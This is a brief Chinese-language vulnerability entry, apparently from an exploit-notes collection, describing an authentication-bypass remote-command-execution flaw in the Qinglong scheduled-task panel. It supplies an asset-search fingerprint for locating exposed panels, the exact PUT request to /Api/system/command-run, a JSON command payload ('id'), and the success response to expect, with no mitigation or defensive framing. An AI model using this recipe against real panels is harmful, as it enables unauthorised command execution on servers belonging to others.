# 青龙面板command-run鉴权绕过导致RCE漏洞

青龙面板command-run ｜ 命令执行 ｜ —
- **指纹**：`app="青龙-定时任务管理面板"`
- **请求**：`PUT /Api/system/command-run HTTP/1.1`

**Payload**
```
{"command": "id"}
```
- **响应特征**：200